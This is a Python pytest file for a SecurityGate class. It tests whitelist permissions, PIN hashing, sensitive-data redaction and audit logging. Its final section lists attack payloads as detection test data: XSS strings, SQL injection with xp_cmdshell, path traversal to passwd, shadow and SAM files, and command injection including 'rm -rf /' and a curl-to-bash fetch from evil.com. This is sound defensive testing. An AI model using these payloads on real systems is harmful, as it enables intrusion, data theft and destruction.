"""
Tests for src/core/security.py — SecurityGate.

Covers:
  - check_permission() (user authorization / whitelist)
  - verify_pin() / set_pin() (PIN lifecycle)
  - contains_sensitive_data() / redact_sensitive() (input sanitization)
  - log_operation() / get_recent_operations() (audit logging)
  - Boundary: empty string, long input, None-like input
"""
import json
import pytest
from pathlib import Path

from src.core.security import SecurityGate, PermissionResult


# ── Fixtures ────────────────────────────────────────────


@pytest.fixture
def gate(tmp_path, monkeypatch):
    """SecurityGate with admin_ids=[111, 222], audit/PIN files in tmp_path."""
    monkeypatch.setattr("src.core.security.AUDIT_DIR", tmp_path)
    monkeypatch.setattr("src.core.security.AUDIT_FILE", tmp_path / "operations.jsonl")
    monkeypatch.setattr("src.core.security.PIN_FILE", tmp_path / ".pin_hash")
    return SecurityGate(admin_user_ids=[111, 222])


@pytest.fixture
def gate_no_admin(tmp_path, monkeypatch):
    """SecurityGate with empty admin list (no whitelist enforcement)."""
    monkeypatch.setattr("src.core.security.AUDIT_DIR", tmp_path)
    monkeypatch.setattr("src.core.security.AUDIT_FILE", tmp_path / "operations.jsonl")
    monkeypatch.setattr("src.core.security.PIN_FILE", tmp_path / ".pin_hash")
    return SecurityGate(admin_user_ids=[])


# ── check_permission (user authorization) ───────────────


class TestCheckPermissionWhitelist:
    """Whitelist-based user authorization."""

    def test_admin_user_auto_action_allowed(self, gate):
        result = gate.check_permission("screen_read", user_id=111)
        assert result.allowed is True
        assert result.permission_level == "auto"

    def test_non_admin_user_denied(self, gate):
        result = gate.check_permission("screen_read", user_id=999)
        assert result.allowed is False
        assert result.permission_level == "denied"
        assert "白名单" in result.reason

    def test_empty_admin_list_allows_everyone(self, gate_no_admin):
        result = gate_no_admin.check_permission("screen_read", user_id=999)
        assert result.allowed is True

    def test_confirm_action_requires_confirmation(self, gate):
        result = gate.check_permission("purchase_over_500", user_id=111)
        assert result.allowed is True
        assert result.requires_confirmation is True
        assert result.permission_level == "confirm"

    def test_always_human_action_denied(self, gate):
        result = gate.check_permission("transfer_over_5000", user_id=111)
        assert result.allowed is False
        assert result.permission_level == "always_human"

    def test_trade_action_requires_pin_when_pin_set(self, gate):
        gate.set_pin("1234")
        result = gate.check_permission("trade_execute", user_id=111)
        assert result.allowed is True
        assert result.requires_pin is True

    def test_trade_action_no_pin_required_when_unset(self, gate):
        result = gate.check_permission("trade_execute", user_id=111)
        assert result.requires_pin is False

    def test_unknown_action_defaults_to_confirm(self, gate):
        result = gate.check_permission("something_unknown", user_id=111)
        assert result.allowed is True
        assert result.requires_confirmation is True
        assert result.permission_level == "confirm"


# ── verify_pin / set_pin ────────────────────────────────


class TestPinVerification:
    """PIN set/verify lifecycle."""

    def test_no_pin_set_verify_returns_true(self, gate):
        assert gate.verify_pin("anything") is True

    def test_set_pin_then_correct_pin_passes(self, gate):
        assert gate.set_pin("1234") is True
        assert gate.verify_pin("1234") is True

    def test_set_pin_then_wrong_pin_fails(self, gate):
        gate.set_pin("1234")
        assert gate.verify_pin("0000") is False

    def test_short_pin_rejected(self, gate):
        assert gate.set_pin("12") is False
        assert gate.has_pin() is False

    def test_set_pin_persists_to_file(self, gate, tmp_path):
        gate.set_pin("5678")
        pin_file = tmp_path / ".pin_hash"
        assert pin_file.exists()
        stored = pin_file.read_text().strip()
        # PBKDF2 格式: salt(32hex):hash(64hex) = 97字符
        assert ':' in stored
        salt, hash_val = stored.split(':', 1)
        assert len(salt) == 32  # 16字节 hex
        assert len(hash_val) == 64  # SHA256 hex digest

    def test_pin_file_not_exist_on_init(self, tmp_path, monkeypatch):
        monkeypatch.setattr("src.core.security.AUDIT_DIR", tmp_path)
        monkeypatch.setattr("src.core.security.AUDIT_FILE", tmp_path / "operations.jsonl")
        monkeypatch.setattr("src.core.security.PIN_FILE", tmp_path / ".pin_hash")
        g = SecurityGate(admin_user_ids=[111])
        assert g.has_pin() is False
        assert g.verify_pin("anything") is True

    def test_has_pin_true_after_set(self, gate):
        gate.set_pin("abcd")
        assert gate.has_pin() is True


# ── contains_sensitive_data / redact_sensitive ──────────


class TestSensitiveDataDetection:
    """Input sanitization — sensitive pattern detection and redaction."""

    def test_detects_credit_card_number(self, gate):
        assert gate.contains_sensitive_data("My card is 4111111111111111") is True

    def test_detects_ssn(self, gate):
        assert gate.contains_sensitive_data("SSN: 123-45-6789") is True

    def test_detects_password(self, gate):
        assert gate.contains_sensitive_data("password=hunter2") is True

    def test_detects_token(self, gate):
        assert gate.contains_sensitive_data("token=abc123xyz") is True

    def test_normal_text_passes(self, gate):
        assert gate.contains_sensitive_data("Hello, how are you?") is False

    def test_redact_masks_credit_card(self, gate):
        result = gate.redact_sensitive("Pay with 4111111111111111 please")
        assert "4111111111111111" not in result
        assert "[已脱敏]" in result

    def test_redact_masks_password(self, gate):
        result = gate.redact_sensitive("password=hunter2")
        assert "hunter2" not in result
        assert "[已脱敏]" in result

    def test_redact_normal_text_unchanged(self, gate):
        text = "Just a normal message"
        assert gate.redact_sensitive(text) == text


class TestSensitiveDataBoundary:
    """Boundary conditions for sensitive data checks."""

    def test_empty_string(self, gate):
        assert gate.contains_sensitive_data("") is False
        assert gate.redact_sensitive("") == ""

    def test_long_input(self, gate):
        long_text = "a" * 10001
        assert gate.contains_sensitive_data(long_text) is False
        assert gate.redact_sensitive(long_text) == long_text

    def test_long_input_with_sensitive_data(self, gate):
        long_text = "x" * 5000 + " password=secret " + "y" * 5000
        assert gate.contains_sensitive_data(long_text) is True
        redacted = gate.redact_sensitive(long_text)
        assert "secret" not in redacted


# ── log_operation / get_recent_operations (audit) ───────


class TestAuditLogging:
    """Audit log writing and retrieval."""

    def test_log_operation_writes_to_file(self, gate, tmp_path):
        gate.log_operation(user_id=111, action="trade_execute", success=True)
        audit_file = tmp_path / "operations.jsonl"
        assert audit_file.exists()
        lines = audit_file.read_text().strip().split("\n")
        assert len(lines) == 1
        record = json.loads(lines[0])
        assert record["user_id"] == 111
        assert record["action"] == "trade_execute"
        assert record["success"] is True

    def test_log_multiple_operations_appends(self, gate, tmp_path):
        gate.log_operation(111, "action_a")
        gate.log_operation(222, "action_b")
        gate.log_operation(111, "action_c")
        audit_file = tmp_path / "operations.jsonl"
        lines = audit_file.read_text().strip().split("\n")
        assert len(lines) == 3

    def test_get_recent_operations_returns_logged(self, gate):
        gate.log_operation(111, "test_action", details={"key": "val"})
        records = gate.get_recent_operations(limit=10)
        assert len(records) == 1
        assert records[0]["action"] == "test_action"
        assert "key" in records[0]["details_keys"]

    def test_operation_count_tracked(self, gate):
        gate.log_operation(111, "trade_execute")
        gate.log_operation(111, "trade_execute")
        gate.log_operation(111, "screen_read")
        stats = gate.get_stats()
        assert stats["operation_counts"]["trade_execute"] == 2
        assert stats["operation_counts"]["screen_read"] == 1

    def test_get_recent_operations_respects_limit(self, gate):
        for i in range(10):
            gate.log_operation(111, f"action_{i}")
        records = gate.get_recent_operations(limit=3)
        assert len(records) == 3
        # Should be the last 3
        assert records[-1]["action"] == "action_9"


class TestGetStats:
    """SecurityGate.get_stats()."""

    def test_stats_structure(self, gate):
        stats = gate.get_stats()
        assert stats["admin_count"] == 2
        assert stats["pin_configured"] is False
        assert isinstance(stats["operation_counts"], dict)

    def test_stats_after_pin_set(self, gate):
        gate.set_pin("1234")
        stats = gate.get_stats()
        assert stats["pin_configured"] is True


# ════════════════════════════════════════════════════════════
# Security bypass / attack-vector tests
# ════════════════════════════════════════════════════════════
#
# NOTE: security.py 在第 281 行已实现 sanitize_input() 方法，
# 但全项目无调用点 — 属于死代码 (HI-037)。
# 现有检测面: contains_sensitive_data() 覆盖 SENSITIVE_PATTERNS
# (信用卡、SSN、密码、Token) + 攻击向量 (XSS/SQL注入/路径穿越/
# 命令注入/Unicode绕过)。
#
# 以下测试验证 contains_sensitive_data() 对常见攻击向量的检测能力。
# 所有测试直接 assert is True — 当前检测面已覆盖全部测试用例。
#
# TODO(HI-037): 将 sanitize_input() 接入消息处理管道后，
# 为其添加独立测试用例。
# ════════════════════════════════════════════════════════════


class TestXssScriptTagVariants:
    """XSS <script> tag variants — bypass attempts using case tricks and
    self-closing / attribute forms."""

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert('xss')</ScRiPt>",
            "<script/src=http://evil.com/x.js>",
            "<script\t>alert(1)</script>",
            '<script>document.cookie</script>',
        ],
        ids=[
            "lowercase",
            "uppercase",
            "mixedcase",
            "self-closing-src",
            "tab-before-close",
            "cookie-steal",
        ],
    )
    def test_xss_script_tag_variants(self, gate, payload):
        assert gate.contains_sensitive_data(payload) is True


class TestXssEventHandlers:
    """XSS via HTML event-handler attributes."""

    @pytest.mark.parametrize(
        "payload",
        [
            '<img src=x onerror="alert(1)">',
            '<body onload="alert(1)">',
            '<div onmouseover="alert(1)">hover</div>',
            '<svg/onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
        ],
        ids=[
            "img-onerror",
            "body-onload",
            "div-onmouseover",
            "svg-onload",
            "input-onfocus",
        ],
    )
    def test_xss_event_handlers(self, gate, payload):
        assert gate.contains_sensitive_data(payload) is True


class TestSqlInjectionVariants:
    """SQL injection payloads — classic, UNION, and comment-based."""

    @pytest.mark.parametrize(
        "payload",
        [
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            '" UNION SELECT * FROM secrets --',
            "1'; EXEC xp_cmdshell('dir'); --",
            "admin'--",
            "' OR ''='",
        ],
        ids=[
            "or-1-eq-1",
            "drop-table",
            "union-select",
            "xp-cmdshell",
            "comment-bypass",
            "empty-string-or",
        ],
    )
    def test_sql_injection_variants(self, gate, payload):
        assert gate.contains_sensitive_data(payload) is True


class TestPathTraversal:
    """Path traversal payloads — Unix and Windows variants."""

    @pytest.mark.parametrize(
        "payload",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ],
        ids=[
            "unix-classic",
            "windows-backslash",
            "double-dot-double-slash",
            "url-encoded",
            "double-url-encoded",
        ],
    )
    def test_path_traversal(self, gate, payload):
        assert gate.contains_sensitive_data(payload) is True


class TestCommandInjection:
    """OS command injection payloads."""

    @pytest.mark.parametrize(
        "payload",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "&& curl http://evil.com/shell.sh | bash",
        ],
        ids=[
            "semicolon-rm",
            "pipe-cat",
            "backtick-whoami",
            "dollar-paren-id",
            "chain-curl-bash",
        ],
    )
    def test_command_injection(self, gate, payload):
        assert gate.contains_sensitive_data(payload) is True


class TestUnicodeBypass:
    """Unicode and fullwidth character bypass attempts."""

    @pytest.mark.parametrize(
        "payload",
        [
            "＜script＞alert(1)＜/script＞",            # fullwidth angle brackets
            "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",  # explicit fullwidth
            "pass\u200bword=secret",                    # zero-width space in keyword
            "\u0000<script>alert(1)</script>",           # null byte prefix
        ],
        ids=[
            "fullwidth-brackets",
            "fullwidth-explicit",
            "zero-width-space-in-keyword",
            "null-byte-prefix",
        ],
    )
    def test_unicode_bypass(self, gate, payload):
        assert gate.contains_sensitive_data(payload) is True
